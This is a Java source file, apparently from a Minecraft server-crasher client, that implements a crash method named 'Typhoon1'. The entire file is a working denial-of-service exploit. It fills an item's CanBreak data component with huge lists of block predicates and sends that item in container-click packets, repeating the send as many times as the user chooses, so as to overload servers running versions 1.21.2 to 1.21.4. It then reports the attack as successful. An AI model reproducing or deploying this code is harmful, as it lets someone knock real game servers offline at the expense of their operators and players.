package us.rin.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import us.rin.crashers.Crasher;
import us.rin.gui.clickgui.ClickGui;
import us.rin.protocol.RedSignalProtocol;
import us.rin.protocol.components.data.DataComponents;
import us.rin.protocol.components.data.impl.DataCanBreak;
import us.rin.protocol.components.objects.ItemStack;
import us.rin.protocol.packets.PacketCodec;
import us.rin.protocol.packets.play.PacketContainerClick;
import us.rin.utils.OptionType;
import us.rin.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;

public class Typhoon1 implements Crasher {

    private static final String METHOD_NAME = "Typhoon1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int count = Integer.parseInt(args[4]);

        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.IS_VISIBLE ? getName() : "******"), true);

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();

        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            List<DataCanBreak.BlockPredicate> predicates = new ArrayList<>(count);

            for (int i = 0; i < count; i++) {
                List<String> blocks = new ArrayList<>(size);

                for (int j = 0; j < size; j++) blocks.add("minecraft:stone");

                predicates.add(new DataCanBreak.BlockPredicate(blocks));
            }

            DataComponents components = new DataComponents();
            components.put(new DataCanBreak(predicates));

            ItemStack stack = new ItemStack(1, 1, components);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10, PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK, stack, new Int2ObjectArrayMap<>()), packets);

        } else {
            msgHelper.sendMessage("To use " + getName() + " you must be using &cVersion 1.21.2/1.21.4&7, and your current protocol is &c" + protocol, true);
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], size[2332], count[11]";
    }

    @Override
    public List<OptionUtil> getOptions() {
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Count", OptionType.INTEGER)
        );
    }

    @Override
    public String getDescription() {
        return "1.20.5+ Components Overload Crash";
    }
}
